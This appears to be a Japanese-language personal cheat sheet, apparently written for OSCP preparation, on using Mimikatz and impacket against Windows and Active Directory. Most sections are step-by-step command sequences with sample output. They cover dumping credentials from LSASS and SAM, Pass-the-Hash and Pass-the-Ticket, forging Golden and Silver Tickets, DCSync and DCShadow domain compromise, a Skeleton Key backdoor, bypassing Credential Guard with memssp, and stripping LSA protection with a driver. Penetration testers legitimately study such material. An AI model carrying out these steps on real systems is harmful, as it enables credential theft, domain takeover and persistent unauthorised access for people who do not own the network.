Mimikatzを使って何ができるかをメインでまとめているが、一部代替手段としてimpacketなども記載している。

# 概要

- **Mimikatz** はWindowsのメモリ／LSA領域からパスワード、NTLMハッシュ、Kerberosチケット、PIN、LSA Secrets などを抽出したり、チケットを偽造・インポート（PtT）したり、DCSync でクレデンシャルを取得したりする、<u>Windowsシステムにおける認証情報窃取のオールインワンツール</u>
- 多くの攻撃手法（Pass-the-Hash, Pass-the-Ticket, Golden/Silver Ticket, DCSync, Overpass-the-Hash, Skeleton Key 等）をサポートする

---

# 実行前提 / 権限

- 基本的に**管理者権限（Local Admin）またはSYSTEM相当**が必要
	- LSASSメモリへアクセスするために `SeDebugPrivilege` が必須で、これは管理者以上がもつことが多い権限
- RDP/SSH 等で対象にアクセスでき、該当ユーザがログオン済みであること（認証情報がメモリに存在すること）が条件となる操作も多い

---

# 主なモジュールとそのコマンドの解説

- すべてのモジュールを確認するには`::`と実行
- モジュール内のコマンドを確認するには`<module>:`と実行

## privilegeモジュール

### privilege::debug

- このコマンドは、実行プロセスに対し、RtlAdjustPrivilege API を使用して **SeDebugPrivilege**権限を有効にする
- SeDebugPrivilege 権限は、デフォルトでローカルの Administrators グループに付与されている 
- この権限があると、システムの任意のプロセスへのハンドルを取得できるので、ローカルの任意のリモートプロセス内のメモリの読み書きなどの操作が可能になる
```powershell
privilege::debug
```
- 成功：Privilege ’20’ OK
- 失敗：ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) xxxx
	- →権限昇格など、なんらかの処理が別途必要になる

## sekurlsaモジュール

- LSASS.exeプロセスからさまざまな認証情報に関するデータを抽出するモジュール
	- lsadumpモジュールと似ているが、lsadumpはレジストリから、 sekurlsaはLSASS.exeプロセスメモリから抽出する点が異なる
- Pass-the-Hash や Pass-the-Ticket などの攻撃を実行する際に使用

### sekurlsa::logonpasswords

- アクティブな Windows セッションをもつユーザの資格情報をすべて表示
- 実行には SeDebugPrivilege 権限もしくはローカルの SYSTEM 権限が必要

#### logonpasswords出力フィールドの意味一覧表

| 項目                | 説明                                                                                                                                                                                                                                                   |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Authentication Id | ログオン時に生成されるユニーク ID（Logon ID）。「`<HighPart> ; <LowPart>`」形式で表記。各パートは HEX（16進）表記。                                                                                                                                                                       |
| Session           | ユーザログオンの種類およびセッション種別。代表的なログオンタイプは以下の通り：<br>• Interactive：対話型ログオン（コンソールでの直接ログオン）<br>• Network：ネットワーク経由のログオン（例：ファイル共有）<br>• Batch：ユーザ操作のないバッチ処理（タスクスケジューラなど）<br>• Service：サービスアカウントによるサービス起動時のログオン<br>• RemoteInteractive：リモートデスクトップ／ターミナルサービス経由でのログオン |
| User Name         | ログオンしたユーザの名前。                                                                                                                                                                                                                                        |
| Domain            | ドメインユーザの場合はドメイン名、ローカルユーザの場合はコンピュータ名。                                                                                                                                                                                                                 |
| Logon Server      | ドメインユーザの場合は認証を行った AD サーバ名。ローカルユーザの場合はコンピュータ名。                                                                                                                                                                                                        |
| Logon Time        | ログオンが実行された日時。                                                                                                                                                                                                                                        |
| SID (Security ID) | ユーザの識別 ID（Security Identifier）。                                                                                                                                                                                                                      |
| msv (MSV1_0)      | MSV1_0 認証パッケージの情報。<br>• Username：ユーザ名• Domain：ドメイン名（ローカルの場合はコンピュータ名）<br>• NTLM：ユーザパスワードの NT ハッシュ<br>• SHA1：ユーザパスワードの SHA1 ハッシュ                                                                                                                       |
| tspkg             | ターミナルサービス認証パッケージ（Terminal Services Package）の情報。                                                                                                                                                                                                      |
| wdigest           | ダイジェスト認証プロトコル（Wdigest）の情報。<br>• Password：プロトコル有効時、資格情報から抽出した平文パスワードを表示。                                                                                                                                                                              |
| kerberos          | Kerberos 認証パッケージの情報。                                                                                                                                                                                                                                 |
| ssp               | セキュリティサポートプロバイダー（Security Support Provider）の情報。                                                                                                                                                                                                      |
| credman           | 資格情報マネージャ（Credential Manager）の情報。                                                                                                                                                                                                                    |

### sekurlsaコマンドについての説明

| コマンド名               |                                                                                                                          用途 | 実行条件                                   |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------: | -------------------------------------- |
| `sekurlsa::pth`     |                                                                            ・PtH 攻撃用のコマンド<br>・指定したユーザー名でハッシュを使って別プロセスを偽装起動する | SeDebugPrivilege 権限もしくはローカルの SYSTEM 権限 |
| `sekurlsa::tickets` | ・ローカルメモリに保存されたすべての利用可能な Kerberos チケット（TGT 等）を一覧表示する<br>・サービスコンテキストのチケットも含めて抽出可能<br>・`/export` を指定すると .kirbi ファイル形式でエクスポートする | SeDebugPrivilege 権限もしくはローカルの SYSTEM 権限 |
| `sekurlsa::ekeys`   |                                 ・Kerberos 認証で使用される暗号鍵（RC4、AES 等）を一覧表示<br>・Overpass-the-Hash 等、検知されにくい攻撃で利用する鍵情報を確認するために使用する | SeDebugPrivilege 権限もしくはローカルの SYSTEM 権限 |

## lsadumpモジュール

- LSA を操作するための各種コマンドを提供
- ほとんどのコマンドの実行には、SeDebugPrivilege 権限もしくはローカルの SYSTEM 権限が 必要

| コマンド名               | 用途                                                                                                                                                                                          |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `lsadump::sam`      | ・ローカルコンピュータに保存されたパスワードの NT または LM ハッシュを取得する<br>・`sekurlsa::logonpasswords` と似ているが、sekurlsaがLSASS.exeプロセスメモリから抽出するのに対し、`lsadump::sam`はレジストリから抽出する<br>（`impacket-secretsdump`と同じことをターゲット上でやる） |
| `lsadump::dcsync`   | ・DCSync 攻撃用コマンド<br>・ADからユーザ情報やハッシュを同期（取得）する                                                                                                                                                 |
| `lsadump::dcshadow` | ドメインコントローラを偽装し、MS-DRSR プロトコルを悪用して正規のドメインコントローラにレプリケーションの変更を通知することで、Active Directory 内のデータを改ざんする操作を行う（レプリケーション経路を通じた永続的な変更や隠蔽に利用される）。                                                        |

## kerberosモジュール

- Kerberos 認証の際に利用される Kerberos API に関連する機能を提供
- コマンドの実行には特別な権限が必要ない

| コマンド名              | 用途                                                                             | 主なパラメータ                                                                              |
| ------------------ | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------ |
| `kerberos::list`   | メモリ内の現在ユーザの Kerberos チケット（TGT、Service Ticket）の一覧表示およびエクスポート                    | `/export`（チケットをファイルへエクスポート）                                                          |
| `kerberos::ptt`    | 指定した Kerberos チケットをインポートして Pass-the-Ticket を実行                                 | ・`/filename`（チケットファイルのパス、複数指定可）<br>・`/directory`（.kirbi ファイルが含まれるディレクトリパス、配下のすべてを挿入） |
| `kerberos::golden` | 任意ユーザ／グループ向けに偽造の TGT または Service Ticket を作成（Golden Ticket / Silver Ticket の発行） | ・[Golden Ticket](#Golden%20Ticket)<br>・[Silver Ticket](#Silver%20Ticket)             |

---

# 起動と基本コマンド

管理者権限でターミナルを開いて実行
```powershell
.\mimikatz.exe
# SeDebugPrivilege を有効化：Privilege '20' OKで使用可能
privilege::debug        
# ローカルのSYSTEMに昇格
token::elevate 
```
- 🚨DCSync、DCShadowにおいては`token::elevate`は使用しない
	- もしローカルユーザーAがDomain Adminsグループに入っているときに`token::elevate`してしまうと、ユーザーAからSYSTEMに昇格されるが、SYSTEMはDomain Adminsグループではないため、逆に権限が不足し、失敗する

非インタラクティブなシェルで実行するとき
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

ログの記録（Mimikatzを起動したディレクトリにコマンド出力が保存される）
```powershell
# ログ記録開始
log <filename>.log

# ログ記録停止
log /stop
```

>[!TIP]
>Mimikatzにはフィルタ機能がないので、ファイルに保存して別途grepやfindを使うことで、効率的に探索できる。

---

# 認証情報の抽出

## LSASS.exeプロセスメモリ からの抽出

- **今、ログオンしているユーザー**の情報（lsadumpより優先的に使用）
	- ログオンしていないユーザーの認証情報は取得できないケースがある
- Kerberosチケット取得可能
- 横展開・Pass-the-Ticket向き
```powershell
# すべてのプロバイダーから認証情報を抽出（初期調査）
sekurlsa::logonpasswords

# MSVプロバイダーからのみ抽出する（NTハッシュだけ欲しいとき）
sekurlsa::msv              

# 現在のKerberosチケットを .kirbi でエクスポート
sekurlsa::tickets /export  
```
- 補足：[プロバイダー](../Misc/用語.md#プロバイダー)

## レジストリからの抽出

- **保存されているすべてのアカウント**の情報
- 永続的、包括的
	- 使えない情報が含まれる可能性がある
	- Kerberosチケットは取得できない
- ドメイン全体のダンプ可能
- Golden Ticket作成向き
```powershell
# SAM からのハッシュ抽出（NTLM等）
lsadump::sam

# LSA Secrets のダンプ（サービスアカウントのパスワード等）
lsadump::secrets

# 指定アカウントのNTLMハッシュ等
lsadump::lsa /inject /name:<account>
```

---

# PtH / OptH

- それぞれ末尾に`/run:`を追加することで、ターゲットの権限でコマンドを直接実行可能

## PtH(Pass-the-Hash)

PtHとは：NTLM認証において、NTハッシュを渡して認証をバイパスするもの
```powershell
# ハッシュのダンプ
sekurlsa::logonpasswords

# PtHの実行
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTHash>
```
対象ユーザーの権限でコマンドプロンプトが立ち上がる

## OptH(Overpass-the-Hash)

### OptHとは

- 基本的にPtHと同じだが、PtHがNTハッシュを利用してターゲットになりすますのに対し、OptHはNTハッシュを利用して<u>Kerberos認証のTGTを発行する</u>
- PtHと比べたメリット：
	- PtHは非推奨のNet-NTLMv2認証を利用するため、セキュリティ製品に気づかれやすいが、OptHは<u>Net-NTLMv2認証を回避して</u>Kerberos認証を利用するため見つかりにくい
	- NTハッシュを取得したが、目的のリソースへのアクセスにはKerberos認証を利用する必要があるケースで役立つ

### OptH w/ NTハッシュ

1. PtHコマンドの実行
```powershell
# ハッシュのダンプ
sekurlsa::logonpasswords

# OptHの実行
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTHash> /run:powershell
```

2. 開かれたPowerShellセッション上から、TGT・TGSの発行
```powershell
# ターゲットホストのドメイン共有にアクセスすることでKerberos認証を発火
net use \\<target_host> # →The command completed successfully.

# TGTの確認
klist

# ↓出力例(Serverの値に着目し、krbtgtの場合はTGTで、それ以外はTGSと判別する)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```
- 補足：この時点でPowerShellセッションでwhoamiコマンドを実行すると、横展開先のユーザーではなく現在のユーザーのIDが表示されるが、これはwhoamiの正常な挙動（==whoamiは現在のプロセスのトークンのみを確認し、インポートされたKerberosチケットは検査しない==）

3. 当該PowerShellセッションにて、Kerberos認証を使用するあらゆるツールが使えるようになった
```powershell
# PsExecの例
.\PsExec.exe \\<target_host> cmd
```

---

# PtT (Pass-the-Ticket)

## PtTとは

- Pass the Ticket は、既存の正規の**TGS**を窃取し、アカウントのパスワードを使用することなく、認証を突破する攻撃手法
	- TGTは作成されたユーザーセッションに紐づけられているため他システムでは再利用できないが、TGSはエクスポートして他のシステムでも再利用できる
- 関連ノート：[チケットの形式](../Cheatsheet/🪟Windows/Active%20Directory/ADの基本.md#チケットの形式)

## PtT攻撃

1. ターゲット上でチケットをファイルへエクスポート
```powershell
sekurlsa::tickets /export
```
- →すべての.kirbiチケットがカレントディレクトリにエクスポートされる

>[!Note]
>`Session Key:`がdesの場合、Windows 7以降では既定無効なので使えない(🔗[Removal of DES in Kerberos for Windows Server and Client - Microsoft](https://techcommunity.microsoft.com/blog/windowsservernewsandbestpractices/removal-of-des-in-kerberos-for-windows-server-and-client/4386903))。

2. 現在のLogon IDを確認する
```powershell
klist
```
```powershell
# 出力例
Current LogonId is 0:0x3e7
Cached Tickets: (0)
```

3. Logon IDと一致するチケットを使って、PtTの実行
	- カレントユーザーと異なるClient Name、かつ、Target Nameに横展開先のホスト名があれば狙い目
	- Service Nameが`krbtgt`であればどのサービスにもアクセスできる
```powershell
kerberos::ptt <xxx.kirbi>
```

>[!NOTE]
>「現在の自分のセッション」にチケットを注入するため、注入したチケットのLUIDと自分のLUIDが一致していないと、コマンド実行時にそのチケットが使われない（[チケットの形式](../Cheatsheet/🪟Windows/Active%20Directory/ADの基本.md#チケットの形式)）

　4. 成否確認
```powershell
klist

# 出力例
#0>     Client: Administrator @ nagoya-industries.com
	Server: MSSQL/nagoya.nagoya-industries.com @ nagoya-industries.com
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
	Start Time: 2/10/2026 17:59:24 (local)
	End Time:   2/8/2036 17:59:24 (local)
	Renew Time: 2/8/2036 17:59:24 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0
	Kdc Called:
```

5. チケットをもつセッションでコマンドを実行
```powershell
# RDP接続かつmimikatzプロンプトのとき
misc::cmd

# リバースシェルなど完全にインタラクティブでないとき
winrs -r:<target_FQDN> cmd.exe

## 代替
.\PsExec64.exe -accepteula \\<target_FQDN> cmd.exe
```
- Golden Ticketのときも上記コマンドで成否確認可能

---

# Golden Ticket

## Golden Ticketとは

- krbtgt のパスワードハッシュを用いて作成された偽装 TGTのことで、ドメイン全体のサービスへアクセスを可能にする

- ✅Mimikatz によって作成される Golden Ticket は、デフォルトで有効期限が10 年であり、かつ、正規のTGTと区別がつかない
- ✅krbtgtのパスワードは自動的に変更されないため、永続性が確保されやすい
- ❌KDCにログが残るので、Silver Ticketよりも見つかりやすい

>[!NOTE]
>2022年10月11日適用のパッチにより、存在しないユーザーのチケットが偽造できなくなった（[KB5008380](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)）。

## Golden Ticketの発行とPtT

1. DCの侵害（一番難しい）

2. 侵害した<u>DC上</u>でGolden Ticket発行に必要な情報を収集
	- krbtgt のパスワードハッシュ
	- ドメインの SID
		- `whoami /user`(最後のRIDは除くこと)
	- ドメイン名 
		- `ipconfig /all`出力の"Primary Dns Suffix"
	- ユーザー名
```powershell
# krbtgtのパスワードハッシュとドメインのSIDを取得
lsadump::lsa /inject /name:krbtgt
# うまくいかない場合
lsadump::lsa /patch
```

3. Golden Ticket発行とPtTの実行
```powershell
# 既存のチケットを削除する
kerberos::purge

# Golden Ticket発行とPtT
kerberos::golden /user:<username> /domain:<ドメイン名> /sid:<ドメインのSID> /krbtgt:<krbtgtのパスワードハッシュ> /ptt
```

4. [PtT攻撃](#PtT攻撃)のステップ4、5で成否確認
	- 後続の攻撃ではKerberos認証を使うため、IPではなく**Domainを使用**すること

---

# Silver Ticket

## Silver Ticketとは

- 特定のサービスに限定してDomain Adminレベルのアクセスが可能になるチケット(TGS)のこと
	- TGSがサービスアカウントのパスワードハッシュで暗号化されてさえいれば、チケットの中身のユーザーを盲目的に信用してしまう

- サービスへのコンソールログインが禁止されていても、Silver Ticketを使ってサービスへDomain Admin相当の操作が可能になるため、Domain Admin操作でコンソールログインを許可するように変更できる

>[!NOTE]
>2022年10月11日適用のパッチにより、存在しないユーザーのチケットが偽造できなくなった（[KB5008380](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)）。

## Silver Ticketの発行とPtT

### 1. Silver Ticket発行に必要な情報を収集 

- *サービスアカウントのNTハッシュ*もしくは平文パスワード
- ドメイン名
	- `ipconfig /all`出力の"Primary Dns Suffix"
- ユーザー名 
	- ==Administratorを使うことが多い==
- ドメインのSID：`whoami /user`(最後のRIDは除くこと)
- SPN
	- [🔍AD Enumeration](../Cheatsheet/🪟Windows/Active%20Directory/🔍AD%20Enumeration.md#SPNの列挙)
- ターゲットのFQDN
	- [🔍AD Enumeration](../Cheatsheet/🪟Windows/Active%20Directory/🔍AD%20Enumeration.md#SPNの列挙)
![](../Images/Pasted%20image%2020251013140928.png)
$$spn列挙と使用する値$$

- ローカル管理者権限があれば、サービスアカウントのパスワードのNTハッシュ、ターゲットのFQDN、サービス名(SPN)を一気に取得できる
```powershell
sekurlsa::logonpasswords
```

### 2. Silver Ticket発行とPtTの実行

サービスアカウントのパスワードは、NTハッシュに変換する
```powershell
kerberos::hash /password:<pw> /user:<username> /domain:<ドメイン名>
```
- [NTLM Hash Generator - codebeautifi.org](https://codebeautify.org/ntlm-hash-generator)でも可

#### ローカルから

- RDP/SSH接続など、完全にインタラクティブなシェルの場合はローカルから実行する

```powershell
# 具体例：kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5... /rc4:e3a... /target:web04.corp.com /service:HTTP /ptt

kerberos::golden /user:<なりすまし対象のusername> /domain:<ドメイン名> /sid:<ドメインのSID> /rc4:<サービスアカウントのNTハッシュ> /target:<ターゲットのFQDN> /service:<サービス名> /ptt
```
- サービスアカウントのパスワードのアルゴリズムによっては/rc4ではなく/aes128や/aes256とする

#### リモートから

- WinRM/リバースシェルなど、非インタラクティブなシェルの場合はリモートから実行する
- ローカルサービスの場合は[HTTP・DNSトンネリング（Chisel, Ligolo-ng, Dnscat2）](../Cheatsheet/Port%20Redirection/HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md)と組み合わせて実行する

0. もし`klist`が使えない場合
```sh
sudo apt update && sudo apt install krb5-user
```
- →realmの入力が求められるが、後で設定するため空でいい

1. Silver Ticketの発行
```sh
# 具体例：impacket-ticketer -nthash E3A.. -domain-sid "S-1-5.." -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator

impacket-ticketer -nthash <サービスアカウントのNTハッシュ> -domain-sid "<ドメインのSID>" -domain <ドメイン名> -spn <サービス名>/<ターゲットのFQDN> <なりすまし対象のusername>
```
- →Silver Ticketを発行すると、`Administrator.ccache`のようなチケットが生成される

2. Kerberosが使うチケットの指定
```sh
export KRB5CCNAME=$PWD/<なりすまし対象のusername>.ccache
```

3. 接続するために`krb5`ファイルの用意
```sh
sudo subl /etc/krb5user.conf
```
```sh
[libdefaults]
	default_realm = <ドメイン名(大文字)>
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
	fcc-mit-ticketflags = true

[realms]	
	<ドメイン名(大文字)> = {
		kdc = <ターゲットのFQDN(小文字)>
	}

[domain_realm]
	.<ドメイン名(小文字)> = <ドメイン名(大文字)>
```

4. 名前解決の用意のため、/etc/hostsに以下を追記
```sh
127.0.0.1       localhost <ターゲットのFQDN(小文字)> <ドメイン名(大文字)>
```

### 3. 成否検証

```
klist
```
- 後続はKerberos認証を使うため、IPではなく**Domainを使用する**こと

| /service | 用途                       | 成否確認コマンド例(ローカル)                                              | 成否確認コマンド例(リモート)                                             |
| -------- | ------------------------ | ------------------------------------------------------------ | ----------------------------------------------------------- |
| cifs     | ファイル共有                   | `dir \\<ターゲットのFQDN>\c$`                                      | `impacket-smbclient -k -no-pass <ターゲットのFQDN>`               |
| http     | WinRM/IIS                | `winrs -r:<ターゲットのFQDN> cmd.exe`                              | `evil-winrm -i <ターゲットのFQDN> -r <ドメイン名>`                     |
| host     | WMI/SCM                  | `PsExec.exe \\<ターゲットのFQDN> cmd`                              | `impacket-psexec -k <ターゲットのFQDN>`                           |
| termsrv  | RDP                      | `mstsc /v:<ターゲットのFQDN>`                                      | `xfreerdp /v:<ターゲットのFQDN> /kerberos`                        |
| MSSQLSvc | SQL                      | `sqlcmd -S <ターゲットのFQDN> -E`                                  | `impacket-mssqlclient -k -no-pass <ターゲットのFQDN>`             |
| ldap     | LDAP<br>(DCsync攻撃が可能になる) | `([adsisearcher]'(sAMAccountName=Administrator)').FindOne()` | `ldapsearch -Y GSSAPI -H ldap://<ターゲットのFQDN> -b "<BaseDN>"` |

---

# DCSync攻撃

- ドメインレプリケーション(複数のDCでデータを同期する仕組み)を悪用し、`krbtgt` 含め任意のアカウントのクレデンシャルを取得できる
- **DC上でMimikatzを実行することなく、ネットワーク経由でDCからパスワードハッシュを取得できる**
	- →取得したハッシュで Golden Ticket 等の偽造が可能

1. Domain Admins、Enterprise Admins、DCのローカルAdministratorsグループ、Domain Controllersのいずれかのユーザーの権限を取得（一番難しい）
	- これらのグループがデフォルトでドメインレプリケーションの権限をもつ

2. DCsync攻撃
	- 🚨`token::elevate`は使用しない
```powershell
# 単一ユーザをターゲットとしたdcsync
lsadump::dcsync /domain:<domain> /user:<target username(krbtgtなど)>

# ドメイン全体の dcsync
log <filename>.txt
lsadump::dcsync /domain:<domain> /all
```
- →すべてのユーザー名・ハッシュがMimikatzのLogファイルに記入されるため、パスワードクラッキングもしくはPtH攻撃につなげる

補足：攻撃者マシン上でリモートからのDCSync攻撃
```zsh
impacket-secretsdump -just-dc-user <target username(krbtgtなど)> <domain>/<Domain/Enterprise Admins or Administratorグループのユーザー>:'<pw>'@<DC_IP>
```

---

# DCShadow攻撃

- [DCSync攻撃](#DCSync攻撃)と同じ権限を用いて、データの複製ではなく改ざんをする

1. Domain Admins、Enterprise Admins、DCのローカルAdministrators、Domain Controllersグループのいずれかのユーザーの権限を取得（一番難しい）
	- これらのグループがデフォルトでドメインレプリケーションの権限をもつ

2. 改ざんするためのデータを用意
	- 🚨`token::elevate`は使用しない
```powershell
lsadump::dcshadow /object:<ObjectのDN> /attribute:primaryGroupID /value:512
```
- primaryGroupID：オブジェクトのグループID
- 512: Domain Adminsグループ

3. 改ざん内容を反映
```powershell
lsadump::dcshadow /push
```

---

# Skeleton Key（バックドア）

- DCのLSASS.exeにパッチを当てることで、１つのマスターパスワードであらゆるユーザーとしてログオンが可能になる
- KerberosがRC4暗号化を使っているときのみ成功

1. DCのローカル管理者権限を取得（一番難しい）

2. DC上でスケルトンキーの発行
```powershell
misc::skeleton
```

3. パスワード：mimikatzで任意のユーザーにアクセス可能になる
```powershell
# 例：DCのAdmin共有にアクセス
net use c:\\<DC>\Admin$ /user:Administrator mimikatz
```

---

# Credential Guardを回避してパスワード窃取

- 関連ノート：[Windows Credential Guardの仕組みとその回避](../Cheatsheet/Common/Password%20Attack.md#Windows%20Credential%20Guardの仕組みとその回避)

## 攻撃の概要

上述のように、LSASS.exeに保存されたクレデンシャルをMimikatzでダンプすることはできないので、ユーザーがログインする「前」または「その瞬間」に資格情報を傍受する。

- 攻撃のアイデア：  
    悪意あるSSPを追加し、SSPI経由で認証時に悪意あるDLLを使わせる。
    
- Mimikatzの `memssp` 機能を使う
    - 悪意あるSSPを、DLLとしてディスクに保存せずに`lsass.exe`のメモリ空間に直接インジェクションする
    - 認証処理の際に資格情報をリアルタイムで傍受可能

## memsspを使ったCredential Guardの回避方法

1. ターゲット上でCredential Guardが有効かどうかの確認
```powershell
Get-ComputerInfo
```
	↓
```
...
DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
...
```

2. Mimikatzの起動・memsspの注入
```powershell
.\mimikatz.exe
privilege::debug
misc::memssp
```
	↓
```
Injected =)
```

3. Mimikatzからexitし、memsspを注入したターゲットのユーザーが認証するのを待つ

4. 認証情報が保存されているlogファイルを閲覧する
```powershell
type C:\Windows\System32\mimilsa.log
```

---

# LSA 保護（Protected Process Light）と回避

==OSCP範囲外==

- Windows の `RunAsPPL`（LSA 保護）を有効にすると通常のユーザ/管理者から LSASS メモリへアクセスできなくなる
    
- カーネルドライバ（mimidrv.sys）を用いてプロテクションを取り除く
```powershell
# ドライバを install/ロード
!+  
!processprotect /process:lsass.exe /remove

# 抽出
sekurlsa::logonpasswords
```

---

# Misc

## ワンライナー実行

インタラクティブなシェルが使えないときに重宝

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```